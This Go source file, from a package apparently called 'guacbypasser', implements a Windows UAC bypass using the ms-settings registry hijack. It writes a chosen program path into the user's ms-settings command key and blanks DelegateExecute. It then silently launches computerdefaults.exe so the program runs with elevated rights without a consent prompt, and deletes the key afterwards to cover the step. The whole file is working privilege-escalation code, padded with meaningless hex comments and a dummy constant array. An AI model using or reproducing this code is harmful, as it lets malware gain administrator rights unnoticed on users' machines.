package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_Computerdefaults(path string) error {
	var wkey32 registry.Key
	var err error

	var c = __W32_ComputerDefaults__{
		Type:   "_cdefaults",
		Method: "registry-command",
		Scode: [8]uintptr{
			0x0ef, 0xdef, 0x0e, 0x0ce,
			0xcc, 0xce, 0x0386c, 0x9d3,
		},

		Location:            fmt.Sprintf("%s\\_computerdefaults.gUAC", os.Getenv("APPDATA")),
		_K_ComputerDefaults: 0x0,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Fatal(err)
	}

	// Load kernel32.dll library ...
	// 0x0863ef ...

	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		log.Fatal(err)
	}

	// Get process address "Wow64DisableWow64FsRedirection" from kernel32.dll ...
	proc32, err := syscall.GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection")
	if err != nil {
		log.Fatal(err)
	}

	_, _, _ = syscall.Syscall(
		uintptr(proc32),
		uintptr(1),
		uintptr(0),
		uintptr(0),
		uintptr(0))

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		log.Fatal(err)
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("", currentDir); err != nil {
		log.Fatal(err)
	}

	// Setting "DelegateExecure" key value to None
	// +0x23df ...

	if err := wkey32.SetStringValue("DelegateExecute", ""); err != nil {
		log.Fatal(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Fatal(err)
	}

	// Sleep for 4 seconds ...
	time.Sleep(4 * 1 * time.Second)

	// Execute cmd-like command "start computerdefaults.exe" ...
	var cmd = exec.Command("cmd", "/C", "start computerdefaults.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()

	time.Sleep(4 * 1 * time.Second)
	// Absolutly delete registry key "Software\Classes\ms-settings\shell\open\command" ...
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		log.Fatal(err)
	}

	return err
}
